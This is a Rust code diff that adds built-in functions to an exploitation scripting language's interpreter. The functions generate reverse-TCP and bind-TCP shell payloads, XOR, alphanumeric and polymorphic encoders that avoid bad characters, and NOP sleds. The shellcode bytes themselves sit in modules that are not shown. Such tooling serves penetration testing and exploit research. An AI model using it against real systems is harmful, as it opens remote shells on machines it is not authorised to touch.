@@ -1783,6 +1783,264 @@ fn eval_expr<'a>(
                     
                     Ok(Value::Bytes(shellcode))
                 }
+                "shellcode_gen" => {
+                    let arch_str = arg_map.get("arch")
+                        .or_else(|| arg_values.get(0))
+                        .map(|v| v.to_string())
+                        .unwrap_or_else(|| "x64".to_string());
+                    
+                    let payload_str = arg_map.get("payload")
+                        .map(|v| v.to_string())
+                        .unwrap_or_else(|| "execve_sh".to_string());
+                    
+                    let arch = crate::shellcode_library::parse_arch(&arch_str)
+                        .map_err(|e| format!("Invalid architecture: {}", e))?;
+                    
+                    let payload = crate::shellcode_library::parse_payload(&payload_str)
+                        .map_err(|e| format!("Invalid payload: {}", e))?;
+                    
+                    let lib = crate::shellcode_library::ShellcodeLibrary::new();
+                    
+                    let mut params_map = HashMap::new();
+                    if let Some(lhost) = arg_map.get("lhost") {
+                        params_map.insert("lhost".to_string(), lhost.to_string());
+                    }
+                    if let Some(lport) = arg_map.get("lport") {
+                        params_map.insert("lport".to_string(), lport.to_string());
+                    }
+                    
+                    let mut shellcode = lib.get_with_params(arch, payload, &params_map)
+                        .map_err(|e| format!("Failed to generate shellcode: {}", e))?;
+                    
+                    // Apply encoding if requested
+                    if let Some(encoder) = arg_map.get("encoder").map(|v| v.to_string()) {
+                        use crate::shellcode_encoders::ShellcodeEncoder;
+                        let mut enc = ShellcodeEncoder::new(shellcode.clone());
+                        
+                        shellcode = match encoder.as_str() {
+                            "xor" => {
+                                let key = if let Some(Value::Number(k)) = arg_map.get("key") {
+                                    *k as u8
+                                } else {
+                                    enc.find_xor_key().unwrap_or(0x42)
+                                };
+                                enc.xor_encode(key).unwrap_or(shellcode)
+                            }
+                            "alphanumeric" | "alnum" => {
+                                enc.alphanumeric_encode().unwrap_or(shellcode)
+                            }
+                            "unicode" => {
+                                enc.unicode_encode().unwrap_or(shellcode)
+                            }
+                            "base64" => {
+                                enc.base64_encode()
+                            }
+                            "url" => {
+                                enc.url_encode()
+                            }
+                            _ => shellcode,
+                        };
+                    }
+                    
+                    // Add NOP sled if requested
+                    if let Some(Value::Number(nop_size)) = arg_map.get("nop_sled") {
+                        let nops = vec![0x90; *nop_size as usize];
+                        shellcode = [nops, shellcode].concat();
+                    }
+                    
+                    use colored::Colorize;
+                    println!("{} Generated {} shellcode ({} bytes)", 
+                        "[SHELLCODE]".cyan(), 
+                        payload_str.yellow(), 
+                        shellcode.len().to_string().green());
+                    
+                    Ok(Value::Bytes(shellcode))
+                }
+                "shellcode_encode" => {
+                    if arg_values.is_empty() {
+                        return Err("shellcode_encode() requires shellcode bytes".to_string());
+                    }
+                    
+                    let shellcode = if let Value::Bytes(bytes) = &arg_values[0] {
+                        bytes.clone()
+                    } else {
+                        return Err("shellcode_encode() requires bytes as first argument".to_string());
+                    };
+                    
+                    let encoder_type = arg_map.get("encoder")
+                        .or_else(|| arg_values.get(1))
+                        .map(|v| v.to_string())
+                        .unwrap_or_else(|| "xor".to_string());
+                    
+                    use crate::shellcode_encoders::ShellcodeEncoder;
+                    let mut encoder = ShellcodeEncoder::new(shellcode.clone());
+                    
+                    // Set bad chars if provided
+                    if let Some(Value::List(bad_chars_list)) = arg_map.get("bad_chars") {
+                        let bad_chars: Vec<u8> = bad_chars_list.iter()
+                            .filter_map(|v| {
+                                if let Value::Number(n) = v {
+                                    Some(*n as u8)
+                                } else {
+                                    None
+                                }
+                            })
+                            .collect();
+                        encoder.set_bad_chars(bad_chars);
+                    }
+                    
+                    let encoded = match encoder_type.as_str() {
+                        "xor" => {
+                            let key = if let Some(Value::Number(k)) = arg_map.get("key") {
+                                *k as u8
+                            } else {
+                                encoder.find_xor_key().ok_or("Failed to find valid XOR key")?
+                            };
+                            encoder.xor_encode(key)?
+                        }
+                        "alphanumeric" | "alnum" => encoder.alphanumeric_encode()?,
+                        "unicode" => encoder.unicode_encode()?,
+                        "base64" => encoder.base64_encode(),
+                        "url" => encoder.url_encode(),
+                        "polymorphic" => {
+                            let min_nop = if let Some(Value::Number(n)) = arg_map.get("min_nop") {
+                                *n as usize
+                            } else {
+                                1
+                            };
+                            let max_nop = if let Some(Value::Number(n)) = arg_map.get("max_nop") {
+                                *n as usize
+                            } else {
+                                5
+                            };
+                            encoder.polymorphic_encode(min_nop, max_nop)
+                        }
+                        _ => return Err(format!("Unknown encoder type: {}", encoder_type)),
+                    };
+                    
+                    use colored::Colorize;
+                    println!("{} Encoded shellcode using {} ({} → {} bytes)", 
+                        "[ENCODE]".cyan(), 
+                        encoder_type.yellow(), 
+                        shellcode.len().to_string().red(),
+                        encoded.len().to_string().green());
+                    
+                    Ok(Value::Bytes(encoded))
+                }
+                "shellcode_reverse_tcp" => {
+                    let lhost = arg_map.get("lhost")
+                        .or_else(|| arg_values.get(0))
+                        .map(|v| v.to_string())
+                        .ok_or("shellcode_reverse_tcp() requires lhost parameter")?;
+                    
+                    let lport = if let Some(Value::Number(p)) = arg_map.get("lport").or_else(|| arg_values.get(1)) {
+                        *p as u16
+                    } else {
+                        return Err("shellcode_reverse_tcp() requires lport parameter".to_string());
+                    };
+                    
+                    let arch_str = arg_map.get("arch")
+                        .map(|v| v.to_string())
+                        .unwrap_or_else(|| "x64".to_string());
+                    
+                    let arch = crate::shellcode_library::parse_arch(&arch_str)
+                        .map_err(|e| format!("Invalid architecture: {}", e))?;
+                    
+                    let lib = crate::shellcode_library::ShellcodeLibrary::new();
+                    let mut params_map = HashMap::new();
+                    params_map.insert("lhost".to_string(), lhost.clone());
+                    params_map.insert("lport".to_string(), lport.to_string());
+                    
+                    let payload = crate::shellcode_library::Payload::ShellReverseTcp;
+                    let shellcode = lib.get_with_params(arch, payload, &params_map)
+                        .map_err(|e| format!("Failed to generate reverse TCP shellcode: {}", e))?;
+                    
+                    use colored::Colorize;
+                    println!("{} Reverse TCP shell: {}:{} ({} bytes)", 
+                        "[SHELLCODE]".cyan(), 
+                        lhost.yellow(), 
+                        lport.to_string().yellow(),
+                        shellcode.len().to_string().green());
+                    
+                    Ok(Value::Bytes(shellcode))
+                }
+                "shellcode_bind_tcp" => {
+                    let lport = if let Some(Value::Number(p)) = arg_map.get("lport").or_else(|| arg_values.get(0)) {
+                        *p as u16
+                    } else {
+                        return Err("shellcode_bind_tcp() requires lport parameter".to_string());
+                    };
+                    
+                    let arch_str = arg_map.get("arch")
+                        .map(|v| v.to_string())
+                        .unwrap_or_else(|| "x64".to_string());
+                    
+                    let arch = crate::shellcode_library::parse_arch(&arch_str)
+                        .map_err(|e| format!("Invalid architecture: {}", e))?;
+                    
+                    let lib = crate::shellcode_library::ShellcodeLibrary::new();
+                    let mut params_map = HashMap::new();
+                    params_map.insert("lport".to_string(), lport.to_string());
+                    
+                    let payload = crate::shellcode_library::Payload::ShellBindTcp;
+                    let shellcode = lib.get_with_params(arch, payload, &params_map)
+                        .map_err(|e| format!("Failed to generate bind TCP shellcode: {}", e))?;
+                    
+                    use colored::Colorize;
+                    println!("{} Bind TCP shell on port {} ({} bytes)", 
+                        "[SHELLCODE]".cyan(), 
+                        lport.to_string().yellow(),
+                        shellcode.len().to_string().green());
+                    
+                    Ok(Value::Bytes(shellcode))
+                }
+                "nop_sled" => {
+                    let size = if let Some(Value::Number(s)) = arg_values.get(0) {
+                        *s as usize
+                    } else {
+                        return Err("nop_sled() requires size argument".to_string());
+                    };
+                    
+                    let polymorphic = arg_map.get("polymorphic")
+                        .map(|v| v.to_string())
+                        .map(|s| s == "true" || s == "1")
+                        .unwrap_or(false);
+                    
+                    use crate::shellcode_encoders;
+                    let nops = if polymorphic {
+                        shellcode_encoders::polymorphic_nop_sled(size, 1, 3)
+                    } else {
+                        shellcode_encoders::nop_sled(size)
+                    };
+                    
+                    use colored::Colorize;
+                    println!("{} NOP sled: {} bytes ({})", 
+                        "[NOP]".cyan(), 
+                        size.to_string().green(),
+                        if polymorphic { "polymorphic".yellow() } else { "static".white() });
+                    
+                    Ok(Value::Bytes(nops))
+                }
+                "shellcode_list" => {
+                    use crate::shellcode_db;
+                    let db = shellcode_db::get_shellcode_db();
+                    let all = shellcode_db::list_all_shellcodes();
+                    
+                    use colored::Colorize;
+                    println!("{} Available shellcodes:", "[SHELLCODE]".cyan());
+                    println!();
+                    for name in all {
+                        if let Some(entry) = db.get(&name) {
+                            println!("  {} - {} ({} bytes, {})",
+                                name.yellow(),
+                                entry.description.white(),
+                                entry.bytes.len().to_string().green(),
+                                format!("{:?}", entry.arch).blue());
+                        }
+                    }
+                    
+                    Ok(Value::Null)
+                }
                 "rop_find" => {
                     if arg_values.is_empty() {
                         return Err("rop_find() requires binary path argument".to_string());
